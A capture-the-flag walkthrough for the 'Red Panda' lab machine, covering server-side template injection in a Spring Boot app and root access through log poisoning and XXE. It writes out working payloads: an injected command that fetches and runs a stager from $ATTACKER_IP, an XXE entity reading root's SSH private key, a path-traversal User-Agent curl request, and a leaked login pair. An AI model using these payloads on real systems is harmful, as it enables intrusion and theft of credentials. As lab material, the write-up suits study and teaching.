
# ***Red Panda***

## *User Own*

We'll start with nmap scan:

```bash
$ sudo nmap 10.10.11.170 -Pn -p- -A -vv -T4 --script discovery,vuln -oN nmap-scan --min-parallelism 55
```

Grab services:

```bash
$ cat nmap-scan | grep -o -e '[0-9]\+/tcp[[:space:]].*'
```

- [ ] 22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
- [ ] 8080/tcp open  http-proxy syn-ack ttl 63

Take a look at http-title: 

```
http-title: Red Panda Search | Made with Spring Boot
```

Great, the backend is written in Java & Spring Boot. Also, whenewer we send
a request to server, we receive an html page in response. That means, that developers
used Server-Side Rendering (SSR).

Insert the following string to induce an error:

> ${{<%[%'"}}%

Error happened! Now we have to find an expression that will be evaluated by SSR
framework. Just by "searching" 7*7, we get 49 in the page.

Visit [Payload All The Things' SSTI section](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection).
Scroll down to "Java" payloads. 

```
Java - Basic injection

    Multiple variable expressions can be used, if ${...} doesn't work try #{...}, *{...}, @{...} or ~{...}.
```

By trial and error we establish that payload, that gives us RCE, has to be enclosed
in *{ ... } .

Example of payload:

```
*{T(java.lang.System).getenv()}
```

Let's get a connection with C2. Put the C2 stager in "exploit.sh", start http server and
execute these commands:

```
*{T(java.lang.Runtime).getRuntime().exec('curl http://$ATTACKER_IP:8000/exploit.sh -o exploit.sh && chmod +x exploit.sh')}

*{T(java.lang.Runtime).getRuntime().exec('bash exploit.sh')}
```

User flag is in woodenk's home directory.

---

## *System Own*

Run linpeas.sh on the infected machine. It picks up a couple of things:

1. PermitRootLogin yes: we can log in as root via ssh
2. Weird directory in root called "/credits"
3. Processes run as root:

```bash
$ pstree -p root -a
```

```
  ├─cron,875 -f
  │   └─cron,878 -f
  │       └─sh,880 -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
  │           └─sudo,881 -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
  │               └─java,888 -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
```

Applications' files are in /opt directory. Transfer them to your machine for further analysis.

We'll find database credentials that also work for ssh:

> woodenk:RedPandazRule

We'll start with PandaSearch app:

1. Each request gets logged in /opt/panda_search/redpanda.log
2. Log entry looks like:
```
responseCode + "||" + remoteAddr + "||" + UserAgent + "||" + requestUri
```
3. Controller has 3 endpoints:
    1. /search:
        - Gets panda's name from request parameter "name"
        - Filters out queries that contain "%", "_", "$", "~"
        - Gets panda's info if its name is LIKE %name%
        - Puts the info into page
    2. /stats
        - Gets author's name from optional request param "author"
        - Author has to be one of ["woodenk", "damian"]
        - Reads file from "/credits/" + author + "_creds.xml" file and returns the contents
    3. /export.xml
        - Gets author's name from request param "author"
        - Author has to be one of ["woodenk", "damian"]
        - Reads file from "/credits/" + author + "_creds.xml" file and returns the contents

Let's move on to Logger. In a nutshell, what it does is:

1. Read strings from /opt/panda_search/redpanda.log file.
2. In order for a string to be parsed, it has to contain ".jpg"
3. Each parsed string is splitted by "||" to get:
   1. status_code (int)
   2. ip (string)
   3. user_agent (string)
   4. uri (string)
4. Infer author from uri:
   1. Read metadata from /opt/panda_search/src/main/resources/static$uri
   2. Return the value of "Artist" in metadata
   3. Build xml path: "/credits/" + $artist + "_creds.xml"
   4. Build XML file at that path if not exists with similar structure:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
   <image>
      <uri>/img/angy-author.jpg</uri>
      <views>1</views>
   </image>
   <totalviews>1</totalviews>
</root>
```

5. Read XML at that path. If uri matches $uri, then update it.

### ***Exploitation***

1. Download any jpg from the Internet and modify its metadata: set Artist to relative 
path of you XXE payload, altough remember that malicious XML file will have
"_creds.xml" appended by logger:

```bash
$ exiftool "-Artist=../../../../../../../../../../../../../../../../../../home/woodenk/xxe" malicious.jpg
```

2. Create xxe_creds.xml file with the following contents:

```xml
<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">]>
<root>
    <image>
        <uri>/img/angy-author.jpg</uri>
        <views>2</views>
        <foo>&xxe;</foo>
    </image>
    <totalviews>2</totalviews>
</root>
```

3. Transfer both files into woodenk's home directory. 

4. Trick logger into reading a malicious image file instead of a legitimate one.
You will have to add the following entry to the log file:

```
200||10.10.10.10||FF||/../../../../../../../../../../../../home/woodenk/malicious.jpg
```

Unfortunately, we can't just visit the /../../...../malicious.jpg, because the "../"
stuff will be resolved into "", so what you'll be really visiting is "/home/.....".
Luckily for us, we can write stuff before the vulnerable parameter "uri". So we can
poison "User-Agent" to look like "||/../../......./malicious.jpg". We need "||" on the
start to "shift" the payload into position where uri would be:

```bash
$ curl http://10.10.11.170:8080/aaaaa -H "User-Agent: ||/../../../../../../../../../../../../home/woodenk/malicious.jpg"
```

5. Checkout your xxe_creds.xml for root's private ssh key!
